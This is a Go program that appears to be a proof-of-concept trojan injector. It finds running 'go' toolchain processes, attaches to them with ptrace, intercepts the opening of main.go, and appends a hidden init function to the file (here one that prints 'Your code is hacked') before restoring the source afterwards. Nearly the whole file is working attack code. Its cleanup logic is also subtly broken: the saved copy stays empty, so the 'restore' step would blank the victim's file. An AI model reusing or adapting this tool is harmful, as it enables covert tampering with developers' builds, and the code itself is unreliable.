package main

import "C"

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/signal"
	"strings"
	"syscall"

	ps "github.com/mitchellh/go-ps"
	sec "github.com/seccomp/libseccomp-golang"
)

const hackerstring string = `
func init() {
	fmt.Println("Your code is hacked")
}
	`

type xploit struct {
	pid         int
	cleanSource []byte
	path        string
	isPatched   bool
}

var xploits []xploit

func (e xploit) patch() error {
	original, err := patchfile(e.path, hackerstring)
	if err != nil {
		log.Printf("Unable to patch file with trojan, %v", err)
	}
	copy(e.cleanSource, original)
	return err
}

func (e xploit) clean() error {
	err := cleanfile(e.path, e.cleanSource)
	if err != nil {
		log.Printf("Unable to replace trojanized source with clean source, %v", err)
	}

	return err
}

func (e xploit) trace() error {
	var regs syscall.PtraceRegs
	var err error

	exit := true

	_ = syscall.PtraceAttach(e.pid)

	for {
		if exit {
			err = syscall.PtraceGetRegs(e.pid, &regs)
			if err != nil {
				break
			}

			name, _ := sec.ScmpSyscall(regs.Orig_rax).GetName()
			if name == "openat" {

				path, err := getOpenAtPath(e.pid, regs)
				if err != nil {
					fmt.Println(err)
				}
				e.path = path

				if strings.Contains(path, "main.go") {
					fmt.Printf("Path: %s\n", e.path)
					fmt.Printf("Name: %s\n", name)
					err = e.patch()
					if err != nil {
						log.Printf("Error patching file, %v", err)
					}

				}
			}
		}

		err = syscall.PtraceSyscall(e.pid, 0)
		if err != nil {
			break
		}

		_, err = syscall.Wait4(e.pid, nil, 0, nil)
		if err != nil {
			break
		}

		exit = !exit
	}
	return nil
}

func main() {
	xploits = []xploit{}
	c := make(chan os.Signal)

	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-c
		os.Exit(1)
	}()

	//Main control loop
	for {
		//Loop through list of exploit targets and clean up
		for idx, xpl := range xploits {
			_, err := ps.FindProcess(xpl.pid)
			if err != nil {
				err = xpl.clean()
				if err == nil {
					//remove target from slice
					xploits = removeIndex(xploits, idx)
					break
				}

			}
		}
		//find new targets
		findproc(&xploits)
	}
}

func findproc(exploit *[]xploit) {
	procs, err := ps.Processes()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	for _, proc := range procs {
		exec := proc.Executable()

		if exec == "go" {
			eh, _ := os.FindProcess(proc.Pid())
			xploit := xploit{
				pid: eh.Pid,
			}
			xploits = append(xploits, xploit)
		}
	}
}

func patchfile(path string, trojan string) ([]byte, error) {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		log.Printf("Error Reading file %v", err)
		return data, err
	}

	fmt.Println(path)

	// add init function
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Error Opening File, %v", err)
		return data, err
	}

	if _, err := f.WriteString(trojan); err != nil {
		log.Printf("Error writing to file, %v", err)
	}

	return data, err

}

func cleanfile(path string, original []byte) error {
	f, err := os.OpenFile(path, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
	if err != nil {
		log.Fatal(err)
	}

	_, err = f.Write(original)
	if err != nil {
		log.Printf("Error writing file %v", err)
		return err
	}

	err = f.Close()
	if err != nil {
		log.Printf("Error closing file %v", err)
		return err
	}
	return nil
}

func getOpenAtPath(pid int, regs syscall.PtraceRegs) (string, error) {
	path, err := readString(pid, uintptr(regs.Rsi))
	if err != nil {
		return "", err
	}
	return path, nil
}

func readString(pid int, addr uintptr) (string, error) {
	data := make([]byte, 4096)
	bytes_copied, _ := syscall.PtracePeekData(pid, addr, data)
	if bytes_copied == 0 {
		return "", fmt.Errorf("0-byte string returned")
	}
	str := C.GoString((*C.char)(C.CBytes(data)))
	return str, nil
}

func contains(s []int, e int) bool {
	for _, a := range s {
		if a == e {
			return true
		}
	}
	return false
}

func removeIndex(s []xploit, index int) []xploit {
	return append(s[:index], s[index+1:]...)
}
